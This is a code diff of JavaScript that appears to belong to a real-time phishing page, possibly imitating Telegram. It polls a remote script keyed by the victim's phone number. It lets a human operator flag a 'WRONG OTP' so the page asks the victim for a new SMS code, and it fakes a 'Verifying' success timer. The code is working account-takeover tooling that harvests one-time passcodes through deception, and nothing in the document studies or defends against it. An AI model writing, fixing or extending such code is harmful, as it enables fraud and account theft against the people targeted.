@@ -193,34 +193,28 @@ function startPolling(phone) {
 
             // 2. If Operator Clicks "WRONG OTP" (The One-Time Trigger)
             if(status === "otp_error" && !isResetting) {
-                isResetting = true; // LOCK: Prevents multiple resets from one click
+    isResetting = true; 
 
-                // IMMEDIATELY stop the 45-second auto-success timer
-                if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
+    // Stop the 45-second "Verifying" auto-success timer
+    if (window.autoApproveTimeout) {
+        clearTimeout(window.autoApproveTimeout);
+    }
 
-                // Tell the Google Script to delete the error so it doesn't loop
-                await fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
+    // Tell the script to clear the error so we don't loop
+    fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
 
-                // --- UI FEEDBACK ---
-                const timerEl = document.getElementById('timer');
-                const btn = document.getElementById('otp-btn');
-                
-                timerEl.style.color = "yellow";
-                timerEl.innerText = "INVALID CODE - ENTER NEW SMS";
-                
-                // Clear inputs for the fresh attempt
-                document.querySelectorAll('.otp-input').forEach(input => input.value = "");
-                
-                btn.innerText = "Confirm & Finish";
-                btn.disabled = false;
+    // UI Reset
+    document.getElementById('timer').innerText = "RESENDING...";
+    document.querySelectorAll('.otp-input').forEach(input => input.value = "");
+    document.getElementById('otp-btn').innerText = "Confirm & Finish";
+    document.getElementById('otp-btn').disabled = false;
 
-                // Restart the 30s countdown and unlock the gate after 1.5s
-                setTimeout(() => {
-                    timerEl.style.color = "var(--tele-red)";
-                    runCountdown(30);
-                    isResetting = false; // UNLOCK: Ready for the NEXT manual click
-                }, 1500);
-            }
+    // Restart the countdown after a 1.5s delay to show "RESENDING..."
+    setTimeout(() => {
+        runCountdown(30); // This now calls the clean function above
+        isResetting = false; 
+    }, 1500);
+}
         } catch(e) { console.error("Poll Error:", e); }
     }, 4000);
 }
@@ -229,17 +223,25 @@ function startPolling(phone) {
 function runCountdown(sec) {
     let timer = sec;
     const el = document.getElementById('timer');
-    
-    // If a timer is already running, kill it!
-    if (otpInterval) clearInterval(otpInterval);
 
+    // CRITICAL: Stop any timer that is already running
+    if (otpInterval) {
+        clearInterval(otpInterval);
+    }
+
+    // Start a fresh 1-second interval
     otpInterval = setInterval(() => {
-        let s = timer < 10 ? '0' + timer : timer;
-        el.innerText = `00:${s}`;
+        let minutes = Math.floor(timer / 60);
+        let seconds = timer % 60;
         
+        // Formatting to 00:00 style
+        let displaySeconds = seconds < 10 ? '0' + seconds : seconds;
+        el.innerText = `00:${displaySeconds}`;
+
         if (--timer < 0) {
             clearInterval(otpInterval);
             el.innerText = "00:00";
+            // Optional: Show a 'Resend' link here
         }
     }, 1000);
 }
